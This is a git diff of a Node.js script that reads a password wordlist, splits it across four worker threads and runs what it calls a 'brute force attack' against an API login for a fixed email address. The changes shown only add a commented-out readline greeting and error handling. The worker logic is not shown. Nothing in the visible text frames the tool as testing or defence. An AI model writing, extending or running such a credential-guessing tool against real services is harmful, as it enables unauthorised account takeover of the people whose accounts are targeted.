@@ -4,7 +4,15 @@ import 'dotenv/config'
 import { Worker } from 'worker_threads'
 const API_URL = process.env.API_URL
 const email = 'sami@gmail.com'
-
+// import readline from 'node:readline';
+// const rl = readline.createInterface({
+//   input: process.stdin,
+//   output: process.stdout,
+// });
+// rl.question(`What's your name?`, name => {
+//   console.log(`Hi ${name}!`);
+//   rl.close();
+// });
 const numThreads = 4;
 
 function startWorker(data){
@@ -23,6 +31,8 @@ function startWorker(data){
 }
 
 async function main() {
+
+  try {
     const passwords = fs.readFileSync('./password.txt','utf-8').split('\n').map(password=> password.trim())
     const chunkSize = Math.ceil(passwords.length / numThreads);
     const passwordChunks = [];
@@ -40,11 +50,15 @@ async function main() {
     }));
     
     try {
-        // Execute all promises
+      // Execute all promises
       await Promise.all(workerPromises);
       console.log('Brute force attack completed.');
     } catch (err) {
       console.error('Error in brute force attack:', err);
     }
+  } catch (error) {
+    console.log(error);
+  }
+    
   }
   main();
